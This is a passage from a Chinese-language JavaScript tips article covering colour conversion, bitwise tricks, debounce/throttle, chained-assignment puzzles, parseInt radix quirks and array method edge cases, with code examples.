<h3 id="12-4-颜色值转换"><a href="#12-4-颜色值转换" class="headerlink" title="12.4 颜色值转换"></a>12.4 颜色值转换</h3><h4 id="16-进制-gt-RGB"><a href="#16-进制-gt-RGB" class="headerlink" title="16 进制-&gt;RGB"></a>16 进制-&gt;RGB</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexToRGB</span>(<span class="params">hex</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hex = hex.replace(<span class="string">'#'</span>, <span class="string">'0x'</span>),</span><br><span class="line">    r = hex &gt;&gt; <span class="number">16</span>,</span><br><span class="line">    g = (hex &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>,</span><br><span class="line">    b = hex &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'rgb('</span> + r + <span class="string">','</span> + g + <span class="string">','</span> + b + <span class="string">')'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hexToRGB(<span class="string">'#ff00cc'</span>); <span class="comment">// 'rgb(255,0,204)'</span></span><br></pre></td></tr></table></figure>
<h4 id="RGB-gt-16-进制"><a href="#RGB-gt-16-进制" class="headerlink" title="RGB-&gt;16 进制"></a>RGB-&gt;16 进制</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RGBToHex</span>(<span class="params">rgb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> rgbArr = rgb.split(<span class="regexp">/[^\d]+/</span>),</span><br><span class="line">    color = (rgbArr[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (rgbArr[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | rgbArr[<span class="number">3</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'#'</span> + color.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RGBToHex(<span class="string">'rgb(255,0,204)'</span>); <span class="comment">// '#ff00cc'</span></span><br></pre></td></tr></table></figure>
<h3 id="12-5-indexOf-判断索引存在："><a href="#12-5-indexOf-判断索引存在：" class="headerlink" title="12.5 indexOf 判断索引存在：~"></a>12.5 indexOf 判断索引存在：<code>~</code></h3><p>按位非<code>~-1 === 0</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'abc'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(~str.indexOf(<span class="string">'a'</span>)); <span class="comment">// -1</span></span><br><span class="line"><span class="built_in">console</span>.log(~str.indexOf(<span class="string">'bc'</span>)); <span class="comment">// -2</span></span><br><span class="line"><span class="built_in">console</span>.log(~str.indexOf(<span class="string">'cd'</span>)); <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<h3 id="12-6-构造属性集："><a href="#12-6-构造属性集：" class="headerlink" title="12.6 构造属性集：|"></a>12.6 构造属性集：<code>|</code></h3><p>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postFlag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pos.right &lt; maxLen) posFlag |= <span class="number">1</span>; <span class="comment">// 右边超出</span></span><br><span class="line"><span class="keyword">if</span> (pos.top &lt; maxLen) posFlag |= <span class="number">2</span>; <span class="comment">//上面超出</span></span><br><span class="line"><span class="keyword">if</span> (pos.left &lt; maxLeftLen) posFlag |= <span class="number">4</span>; <span class="comment">//左边超出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对超出的情况进行处理，代码略</span></span><br><span class="line"><span class="keyword">switch</span> (posFlag) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//右</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//上</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//右上</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//左</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>: <span class="comment">//左上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="12-7-2-的-n-次方或开方-lt-lt"><a href="#12-7-2-的-n-次方或开方-lt-lt" class="headerlink" title="12.7 2 的 n 次方或开方: &lt;&lt;"></a>12.7 2 的 n 次方或开方: <code>&lt;&lt;</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;&lt; n 等于 Math.pow(2, n)</span><br></pre></td></tr></table></figure>
<p>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &lt;&lt; <span class="number">1</span>; <span class="comment">// 2</span></span><br><span class="line"><span class="number">1</span> &lt;&lt; <span class="number">3</span>; <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<h3 id="13-简单类型转换"><a href="#13-简单类型转换" class="headerlink" title="13 简单类型转换"></a>13 简单类型转换</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myVar = <span class="string">'3.14159'</span>,</span><br><span class="line">  str = <span class="string">''</span> + myVar, <span class="comment">//  to string</span></span><br><span class="line">  i_int = ~~myVar, <span class="comment">//  to integer</span></span><br><span class="line">  f_float = <span class="number">1</span> * myVar, <span class="comment">//  to float</span></span><br><span class="line">  b_bool = !!myVar <span class="comment">/*  to boolean - any string with length </span></span><br><span class="line"><span class="comment">                                and any number except 0 are true */</span>,</span><br><span class="line">  array = [myVar]; <span class="comment">//  to array</span></span><br></pre></td></tr></table></figure>
<h3 id="14-重视-while"><a href="#14-重视-while" class="headerlink" title="14 重视 while"></a>14 重视 while</h3><p>在 JavaScript 中，我们可以使用 for(;;),while(),for(in)三种循环，事实上，这三种循环中 for(in)的效率极差，因为他需要查询散列键，只要可以，就应该尽量少用。for(;;)和 while 循环，while 循环的效率要优于 for(;;)，可能是因为 for(;;)结构的问题，需要经常跳转回去。<br>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, l = arr.length; i &lt; l; i++) &#123;</span><br><span class="line">  sum += arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以考虑替换为：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>];</span><br><span class="line"><span class="keyword">var</span> sum = <span class="number">0</span>,</span><br><span class="line">  l = arr.length;</span><br><span class="line"><span class="keyword">while</span> (l--) &#123;</span><br><span class="line">  sum += arr[l];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="15-释放-JavaScript-对象"><a href="#15-释放-JavaScript-对象" class="headerlink" title="15 释放 JavaScript 对象"></a>15 释放 JavaScript 对象</h3><ul>
<li>对象：<code>obj = null</code></li>
<li>对象属性：<code>delete obj.myproperty</code></li>
<li>数组 item：使用数组的 splice()方法释放数组中不用的 item</li>
</ul>
<h3 id="16-Chrome-中的-和"><a href="#16-Chrome-中的-和" class="headerlink" title="16 Chrome 中的$和$\$"></a>16 Chrome 中的$和$\$</h3><ul>
<li>\$: document.querySelector</li>
<li>$$<br>$$</li>
</ul>
<p>像 jq。<br>如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $id = $(<span class="string">'#id'</span>);</span><br><span class="line"><span class="keyword">var</span> $$items = $(<span class="string">'.m-items'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="17-document-visibilityState"><a href="#17-document-visibilityState" class="headerlink" title="17 document.visibilityState"></a>17 document.visibilityState</h3><p>监听页面显示状态，可通过监听 visibilitychange 事件，并且根据 document.visibilityState 来判断当前状态，如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(</span><br><span class="line">  <span class="string">'visibilitychange'</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">document</span>.visibilityState) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'prerender'</span>:</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 网页预渲染，此时内容不可见</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'hidden'</span>:</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 处于后台状态、最小化（pc）、或锁屏状态，内容不可见</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'visible'</span>:</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 内容可见</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">'unloaded'</span>:</span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 文档被卸载</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>移动基本无兼容问题。</p>
<h3 id="18-shim-和-polyfill"><a href="#18-shim-和-polyfill" class="headerlink" title="18 shim 和 polyfill"></a>18 shim 和 polyfill</h3><h4 id="Shim"><a href="#Shim" class="headerlink" title="Shim"></a>Shim</h4><p>Shim 指的是在一个旧的环境中模拟出一个新 API ，而且仅靠旧环境中已有的手段实现，以便所有的浏览器具有相同的行为。主要特征：</p>
<ul>
<li>该 API 存在于现代浏览器中;</li>
<li>浏览器有各自的 API 或 可通过别的 API 实现;</li>
<li>API 的所有方法都被重新实现；</li>
<li>拦截 API 调用，并提供自己的实现；</li>
<li>是一个优雅降级。</li>
</ul>
<p>如 IE8 模拟 document.getElementsByClassName</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">document</span>.getElementsByClassName) &#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementsByClassName = <span class="function"><span class="keyword">function</span> (<span class="params">className, element</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> children = (element || <span class="built_in">document</span>).getElementsByTagName(<span class="string">'*'</span>);</span><br><span class="line">    <span class="keyword">var</span> elements = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, ilen = children.length; i &lt; ilen; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> child = children[i];</span><br><span class="line">      <span class="keyword">var</span> classNames = child.className.split(<span class="string">' '</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, jlen = classNames.length; j &lt; jlen; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (classNames[j] == className) &#123;</span><br><span class="line">          elements.push(child);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> elements;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Polyfill"><a href="#Polyfill" class="headerlink" title="Polyfill"></a>Polyfill</h4><p>Polyfill 是一段代码(或者插件)，提供了那些开发者们希望浏览器原生提供支持的功能。程序库先检查浏览器是否支持某个 API，如果不支持则加载对应的 polyfill。主要特征：</p>
<ul>
<li>是一个浏览器 API 的 Shim;</li>
<li>与浏览器有关;</li>
<li>没有提供新的 API，只是在 API 中实现缺少的功能;</li>
<li>以只需要引入 polyfill，它会静静地工作;</li>
</ul>
<p>shim 的概念要比 polyfill 更大一些，可以将 polyfill 理解为专门兼容浏览器 API 的 shim 。简单的说，如果浏览器 X 支持标准规定的功能，那么 polyfill 可以让浏览器 Y 的行为与浏览器 X 一样。</p>
<h3 id="19-函数防抖-节流"><a href="#19-函数防抖-节流" class="headerlink" title="19 函数防抖/节流"></a>19 函数防抖/节流</h3><p>函数防抖是间隔超过一定时间后才会执行，函数节流是一定时间段内只执行一次。<br>函数防抖：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">fn, delay</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (timer) clearTimeout(timer);</span><br><span class="line">    timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      fn.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数节流：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">fn, cycle</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> start = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">let</span> now;</span><br><span class="line">  <span class="keyword">let</span> timer;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    now = <span class="built_in">Date</span>.now();</span><br><span class="line">    clearTimeout(timer);</span><br><span class="line">    <span class="keyword">if</span> (now - start &gt;= cycle) &#123;</span><br><span class="line">      fn.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">      start = now;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      timer = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        fn.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">      &#125;, cycle);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="20-连等代码是不可拆分的"><a href="#20-连等代码是不可拆分的" class="headerlink" title="20 连等代码是不可拆分的"></a>20 连等代码是不可拆分的</h3><p>题：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">n</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> newObj = obj;</span><br><span class="line">obj.m = obj = &#123; <span class="attr">n</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="built_in">console</span>.log(obj);</span><br><span class="line"><span class="built_in">console</span>.log(newObj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// obj = &#123;n: 2&#125;, newObj = &#123;n: 1, m: &#123;n：2&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>赋值操作之前编译器就已经读取到了变量和它的属性 m,然后编译器会在作用域中查找对象是否有 m 属性，没有的话就会生成 m 属性。</p>
<p>类似于</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">n</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> newObj = obj;</span><br><span class="line">obj.m = obj = &#123; <span class="attr">n</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="comment">//改变n的值</span></span><br><span class="line">obj.n = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj); <span class="comment">//&#123;n: 100&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(newObj); <span class="comment">//&#123;n: 1,m: &#123;n: 100&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="有关连等还有个很坑的题"><a href="#有关连等还有个很坑的题" class="headerlink" title="有关连等还有个很坑的题"></a>有关连等还有个很坑的题</h4><p>先看题</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123; <span class="attr">n</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> b = a; <span class="comment">// 持有a，以回查</span></span><br><span class="line">a.x = a = &#123; <span class="attr">n</span>: <span class="number">2</span> &#125;;</span><br><span class="line">alert(a.x); <span class="comment">// --&gt; undefined</span></span><br><span class="line">alert(b.x); <span class="comment">// --&gt; &#123;n:2&#125;</span></span><br></pre></td></tr></table></figure>
<p>1、优先级。.的优先级高于=，所以先执行 a.x，堆内存中的{n: 1}就会变成{n: 1, x: undefined}，改变之后相应的 b.x 也变化了，因为指向的是同一个对象。</p>
<p>类似这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. a: &#123; n: 1, x: null &#125;</span><br></pre></td></tr></table></figure>
<p>赋值操作是从右到左，所以先执行 a = {n: 2}，a 的引用就被改变了，然后这个返回值又赋值给了 a.x，需要注意的是这时候 a.x 是第一步中的{n: 1, x: undefined}那个对象，其实就是 b.x，相当于 b.x = {n: 2}</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2. a: &#123; n: 2 &#125;</span><br><span class="line">3. b: &#123; n: 1, x: &#123;n: 2&#125; &#125;</span><br></pre></td></tr></table></figure>
<h3 id="21-判断是否为质数"><a href="#21-判断是否为质数" class="headerlink" title="21 判断是否为质数"></a>21 判断是否为质数</h3><p>只有 1 和它本身两个约数的数叫质数。例如，2 是质数，因为它只能被 1 和 2 整除。1 不是质数，因为它只能被自身整除。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否为质数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;Number&#125;</span> </span>检验数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;Boolean&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPrimeNumber</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.sqrt(num));</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = s; i &gt; <span class="number">1</span>; i--) <span class="keyword">if</span> (num % i == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="22-arguments-相关"><a href="#22-arguments-相关" class="headerlink" title="22 arguments 相关"></a>22 arguments 相关</h3><h4 id="转数组"><a href="#转数组" class="headerlink" title="转数组"></a>转数组</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line"><span class="keyword">var</span> args = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES2015</span></span><br><span class="line"><span class="keyword">const</span> args = <span class="built_in">Array</span>.from(<span class="built_in">arguments</span>);</span><br><span class="line"><span class="keyword">const</span> args = [...arguments];</span><br></pre></td></tr></table></figure>
<h4 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h4><p>在 JavaScript 中，参数变量和 arguments 是双向绑定的。改变参数变量，arguments 中的值会立即改变；而改变 arguments 中的值，参数变量也会对应改变。<br>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">equal</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  a[<span class="number">1</span>] = a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  a = <span class="number">10</span>;</span><br><span class="line">  equal(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(a + b);</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="number">1</span>, <span class="number">1</span>); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure>
<h3 id="23-利用-parseInt-进行十进制转换"><a href="#23-利用-parseInt-进行十进制转换" class="headerlink" title="23 利用 parseInt()进行十进制转换"></a>23 利用 parseInt()进行十进制转换</h3><p>parseInt() 函数解析一个字符串参数，并返回一个指定基数的整数 (数学系统的基础)。其参数：</p>
<ul>
<li>string：要被解析的值。如果参数不是一个字符串，则将其转换为字符串(使用 ToString 抽象操作)。字符串开头的空白符将会被忽略。</li>
<li>radix：一个介于 2 和 36 之间的整数(数学系统的基础)，表示上述字符串的基数。比如参数”10”表示使用我们通常使用的十进制数值系统。始终指定此参数可以消除阅读该代码时的困惑并且保证转换结果可预测。当未指定基数时，不同的实现会产生不同的结果，通常将值默认为 10。</li>
</ul>
<p>返回值：返回解析后的整数值。 如果被解析参数的第一个字符无法被转化成数值类型，则返回 NaN。</p>
<p>进行进制转换：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">'123'</span>, <span class="number">5</span>); <span class="comment">// 将'123'看作5进制数，返回十进制数38 =&gt; 1*5^2 + 2*5^1 + 3*5^0 = 38</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">101</span>, <span class="number">2</span>); <span class="comment">// 将101看作2进制数，返回十进制数5 =&gt; 1*2^2 + 1*2^0 = 5</span></span><br></pre></td></tr></table></figure>
<h4 id="来一道易错题"><a href="#来一道易错题" class="headerlink" title="* 来一道易错题"></a>* 来一道易错题</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>].map(<span class="built_in">parseInt</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 它的结果是？</span></span><br><span class="line"><span class="comment">// A. ["1", "2", "3"]</span></span><br><span class="line"><span class="comment">// B. [1, 2, 3]</span></span><br><span class="line"><span class="comment">// C. [0, 1, 2]</span></span><br><span class="line"><span class="comment">// D. other</span></span><br></pre></td></tr></table></figure>
<p>map 的回调函数需要三个参数 callback(currentValue, index, array)，因此该数组每次执行回调的分别是 parseInt(“1”, 0), parseInt(“2”, 1), parseInt(“3”, 2)。故答案是 other(<code>[1, NaN, NaN]</code>)。</p>
<h3 id="24-Array-prototype-map-、Array-prototype-reduce-和-Array-prototype-filter-的特殊情况"><a href="#24-Array-prototype-map-、Array-prototype-reduce-和-Array-prototype-filter-的特殊情况" class="headerlink" title="24 Array.prototype.map()、Array.prototype.reduce()和 Array.prototype.filter()的特殊情况"></a>24 Array.prototype.map()、Array.prototype.reduce()和 Array.prototype.filter()的特殊情况</h3><h4 id="Array-prototype-map-会过滤无值的索引"><a href="#Array-prototype-map-会过滤无值的索引" class="headerlink" title="Array.prototype.map()会过滤无值的索引"></a>Array.prototype.map()会过滤无值的索引</h4><p>map 方法会给原数组中的每个元素都按顺序调用一次 callback 函数。callback 每次执行后的返回值组合起来形成一个新数组。 callback 函数只会在有值的索引上被调用；那些从来没被赋过值或者使用 delete 删除的索引则不会被调用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, , , , <span class="number">4</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'a'</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// ['a', 'a', 'a', , , , 'a']</span></span><br></pre></td></tr></table></figure>
<h4 id="Array-prototype-reduce-需要避免空数组"><a href="#Array-prototype-reduce-需要避免空数组" class="headerlink" title="Array.prototype.reduce()需要避免空数组"></a>Array.prototype.reduce()需要避免空数组</h4><p>如果数组为空且没有提供 initialValue，会抛出 TypeError 。如果数组仅有一个元素（无论位置如何）并且没有提供 initialValue， 或者有提供 initialValue 但是数组为空，那么此唯一值将被返回并且 callback 不会被执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].reduce(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;); <span class="comment">// Uncaught TypeError: Reduce of empty array with no initial value at Array.</span></span><br></pre></td></tr></table></figure>
